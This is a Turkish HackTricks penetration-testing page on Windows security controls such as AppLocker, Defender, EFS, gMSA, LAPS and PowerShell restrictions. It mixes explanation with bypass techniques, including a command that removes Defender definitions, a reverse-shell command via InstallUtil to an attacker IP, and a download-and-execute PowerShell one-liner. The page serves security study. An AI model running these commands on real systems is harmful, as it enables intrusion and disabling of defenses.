# Windows Güvenlik Kontrolleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

- **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
- **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'de **takip edin**.
- **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Politikası

Uygulama beyaz listesi, bir sisteme yüklenmesine ve çalıştırılmasına izin verilen onaylanmış yazılım uygulamaları veya yürütülebilir dosyaların listesidir. Amaç, zararlı kötü amaçlı yazılımlardan ve organizasyonun belirli iş gereksinimleriyle uyumlu olmayan onaylanmamış yazılımlardan ortamı korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **uygulama beyaz listeleme çözümü** olup sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği üzerinde kontrol sağlar**. Yürütülebilir dosyalar, betikler, Windows yükleyici dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri üzerinde **ayrıntılı kontrol** sağlar.\
Organizasyonların genellikle **cmd.exe ve PowerShell.exe'yi engellediği** ve belirli dizinlere yazma erişimini engellediği **ancak bunların hepsinin atlatılabileceği** yaygındır.

### Kontrol

Hangi dosyaların/uzantıların siyah listeye alındığını/beyaz listeye alındığını kontrol edin:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir ve sisteme uygulanan mevcut kural setini incelemek için bir yol sağlar:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Atlatma

* AppLocker Politikasını atlamak için kullanışlı **Yazılabilir klasörler**: Eğer AppLocker, `C:\Windows\System32` veya `C:\Windows` içinde herhangi bir şeyi yürütmeye izin veriyorsa, bu **atlamak için kullanabileceğiniz yazılabilir klasörler** bulunmaktadır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Genellikle **güvenilir** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyaları, AppLocker'ı atlamak için de kullanışlı olabilir.
* **Kötü yazılmış kurallar da atlanabilir**
* Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, herhangi bir yerde **`allowed`** adında bir klasör oluşturabilir ve izin verilecektir.
* Kuruluşlar genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir** dosyasını engellemeye odaklanırken, diğer [**PowerShell yürütülebilir konumlarını**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) unuturlar, örneğin `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe`.
* **DLL zorlaması nadiren etkinleştirilir** çünkü sisteme ek yük getirebilir ve hiçbir şeyin bozulmayacağını sağlamak için gereken test miktarı. Bu nedenle, **DLL'leri arka kapı olarak kullanmak, AppLocker'ı atlamaya yardımcı olacaktır**.
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak **Powershell** kodunu herhangi bir işlemde yürüterek AppLocker'ı atlayabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Kimlik Bilgileri Depolama

### Güvenlik Hesap Yöneticisi (SAM)

Yerel kimlik bilgileri bu dosyada bulunur, şifreler karmalanmıştır.

### Yerel Güvenlik Otoritesi (LSA) - LSASS

**Kimlik bilgileri** (karmalanmış) bu alt sistem belleğinde **kaydedilir** Tek Oturum Açma nedenleri için.\
**LSA**, yerel **güvenlik politikasını** (şifre politikası, kullanıcı izinleri...), **kimlik doğrulama**, **erişim belgeleri** yönetir...\
LSA, yerel bir oturum açma için **sunulan kimlik bilgilerini** **SAM** dosyası içinde kontrol edecek ve bir alan kullanıcısını doğrulamak için **alan denetleyicisi** ile iletişim kuracak olan kişi olacaktır.

**Kimlik bilgileri** **LSASS işlemi içinde kaydedilir**: Kerberos biletleri, NT ve LM karmaları, kolayca şifrelenmiş şifreler.

### LSA sırları

LSA, diske bazı kimlik bilgilerini kaydedebilir:

* Erişilemeyen alan denetleyicisinin bilgisayar hesabının şifresi.
* Windows hizmetlerinin hesaplarının şifreleri
* Zamanlanmış görevlerin şifreleri
* Daha fazlası (IIS uygulamalarının şifresi...)

### NTDS.dit

Bu, Active Directory veritabanıdır. Yalnızca Alan Denetleyicilerinde bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender), Windows 10 ve Windows 11'de ve Windows Sunucusu sürümlerinde bulunan bir Antivirüstür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Bununla birlikte, bu korumaları **atlamak için yollar** vardır.

### Kontrol

**Defender'ın durumunu kontrol etmek** için PS cmdlet **`Get-MpComputerStatus`**'u yürütebilirsiniz (**etkin olup olmadığını bilmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ayrıca, bunu sıralamak için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifrelenmiş Dosya Sistemi (EFS)

EFS, dosyaları şifreleyerek güvenli hale getirir ve **Dosya Şifreleme Anahtarı (FEK)** olarak bilinen bir **simetrik anahtar** kullanır. Bu anahtar, kullanıcının **genel anahtarı** ile şifrelenir ve şifreli dosyanın $EFS **alternatif veri akışı** içinde saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasının karşılık gelen **özel anahtarı**, FEK'yi $EFS akışından çözmek için kullanılır. Daha fazla ayrıntıya [buradan](https://en.wikipedia.org/wiki/Encrypting\_File\_System) ulaşılabilir.

Kullanıcı başlatmadan **şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table) gibi EFS olmayan bir dosya sistemine taşındığında otomatik olarak şifre çözülür.
- SMB/CIFS protokolü aracılığıyla ağ üzerinden gönderilen şifreli dosyalar, iletim öncesinde şifre çözülür.

Bu şifreleme yöntemi, sahibin şifreli dosyalara **şeffaf erişim** sağlar. Ancak, sadece sahibin şifresini değiştirmek ve oturum açmak, şifre çözümüne izin vermeyecektir.

**Anahtar Noktalar**:

- EFS, kullanıcının genel anahtarı ile şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme, FEK'ye erişmek için kullanıcının özel anahtarını kullanır.
- Kopyalama işlemi FAT32'ye veya ağ iletimine gibi belirli koşullar altında otomatik şifre çözme gerçekleşir.
- Şifreli dosyalara sahip olan sahibe ek adımlar olmadan erişilebilir.

### EFS Bilgilerini Kontrol Etme

Bu **hizmeti** kullanan bir **kullanıcının** bu **yolu** kullandığını kontrol etmek için şu yolu kontrol edin: `C:\users\<kullanıcıadı>\appdata\roaming\Microsoft\Protect`

Dosyaya kimin **erişimi** olduğunu kontrol etmek için `cipher /c \<dosya>` komutunu kullanabilirsiniz.
Ayrıca tüm dosyaları **şifrelemek** ve **şifre çözmek** için bir klasör içinde `cipher /e` ve `cipher /d` komutlarını da kullanabilirsiniz.

### EFS Dosyalarını Şifre Çözme

#### Yetkili Sistem Olmak

Bu yöntem, **kurban kullanıcının** ana makinede bir **işlem** çalıştırıyor olmasını gerektirir. Bu durumda, `meterpreter` oturumları kullanarak kullanıcının işlem tokenini taklit edebilirsiniz (`incognito`'dan `impersonate_token` kullanarak). Ya da sadece kullanıcının işlemine `migrate` olabilirsiniz.

#### Kullanıcının Şifresini Bilmek

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Grup Yönetilen Hizmet Hesapları (gMSA)

Microsoft, IT altyapılarında hizmet hesaplarının yönetimini basitleştirmek için **Grup Yönetilen Hizmet Hesapları (gMSA)** geliştirmiştir. Sıklıkla "**Şifre asla süresiz**" ayarının etkin olduğu geleneksel hizmet hesaplarının aksine, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Şifre Yönetimi**: gMSA'lar, otomatik olarak alan veya bilgisayar politikasına göre değişen karmaşık, 240 karakterlik bir şifre kullanır. Bu süreç, Microsoft'un Anahtar Dağıtım Hizmeti (KDC) tarafından yönetilir ve manuel şifre güncellemelerine gerek kalmaz.
- **Gelişmiş Güvenlik**: Bu hesaplar kilitlenmeye karşı bağışıktır ve etkileşimli oturum açmalar için kullanılamaz, güvenliklerini artırır.
- **Birden Fazla Ana Bilgisayar Desteği**: gMSA'lar, birden çok sunucuda çalışan hizmetler için idealdir.
- **Zamanlanmış Görev Yeteneği**: Yönetilen hizmet hesaplarının aksine, gMSA'lar zamanlanmış görevleri çalıştırmayı destekler.
- **Basitleştirilmiş SPN Yönetimi**: Sistem, bilgisayarın sAMaccount ayrıntıları veya DNS adı değiştiğinde Hizmet Başlığı Adı (SPN) otomatik olarak günceller, SPN yönetimini basitleştirir.

gMSA'ların şifreleri _**msDS-ManagedPassword**_ LDAP özelliğinde depolanır ve her 30 günde bir Alan Denetleyicileri (DC'ler) tarafından otomatik olarak sıfırlanır. Bu şifre, [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifrelenmiş bir veri bloğudur ve yalnızca yetkili yöneticiler ve gMSA'ların kurulu olduğu sunucular tarafından alınabilir, böylece güvenli bir ortam sağlanır. Bu bilgilere erişmek için LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantı 'Mühürleme ve Güvenli' ile kimlik doğrulamalı olmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Bu şifreyi [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) ile okuyabilirsiniz.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulun**](https://cube0x0.github.io/Relaying-for-gMSA/)

Ayrıca, **NTLM aktarım saldırısı** gerçekleştirmek için **gMSA**'nın **şifresini okumak** için [bu web sayfasını](https://cube0x0.github.io/Relaying-for-gMSA/) kontrol edin.

## LAPS

**Local Administrator Password Solution (LAPS)**, [Microsoft'tan](https://www.microsoft.com/en-us/download/details.aspx?id=46899) indirilebilir durumda olup yerel Yönetici şifrelerinin yönetimini sağlar. Bu **rastgele**, benzersiz ve **düzenli olarak değiştirilen** şifreler, Active Directory'de merkezi olarak depolanır. Bu şifrelere erişim, yetkilendirilmiş kullanıcılara ACL'ler aracılığıyla kısıtlanmıştır. Yeterli izinler verildiğinde, yerel yönetici şifrelerini okuma yeteneği sağlanır.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Kısıtlanmış Dil Modu

PowerShell [**Kısıtlanmış Dil Modu**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'ı etkili bir şekilde kullanmak için gereken birçok özelliği **kilitler**; COM nesnelerini engeller, yalnızca onaylanmış .NET türlerine izin verir, XAML tabanlı iş akışları, PowerShell sınıfları ve daha fazlasına izin verir.

### **Kontrol**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Atlatma
```powershell
#Easy bypass
Powershell -version 2
```
Mevcut Windows'ta Bu atlamayı çalışmayabilir ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için muhtemelen** **Referans Ekleme**_**Gereksiniminde Bulunabilirsiniz**_ -> _Gözat_ ->_Gözat_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ekleyin ve **projeyi .Net4.5'e değiştirin**.

#### Doğrudan atlatma:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Ters kabuk:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
## PS Yürütme Politikası

Varsayılan olarak **kısıtlayıcı** olarak ayarlanmıştır. Bu politikayı atlatmanın temel yolları:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## Güvenlik Destek Sağlayıcı Arayüzü (SSPI)

Kullanıcıları doğrulamak için kullanılabilecek bir API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmakla görevlidir. Bunun için tercih edilen yöntem Kerberos'tur. Daha sonra SSPI, hangi doğrulama protokolünün kullanılacağını müzakere eder, bu doğrulama protokolleri Güvenlik Destek Sağlayıcı (SSP) olarak adlandırılır, her biri bir DLL olarak her Windows makinesinde bulunur ve iletişim kurabilmek için her iki makinenin de aynı desteği sağlaması gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleri
- %windir%\Windows\System32\msv1\_0.dll
- **Digest**: Web sunucuları ve LDAP, şifre MD5 karma biçiminde
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM olmak üzere, Kerberos varsayılanıdır)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere, birkaç yöntem sunabilir veya sadece birini.

## Kullanıcı Hesabı Denetimi (UAC)

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay iletişim kutusunu etkinleştiren** bir özelliktir.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
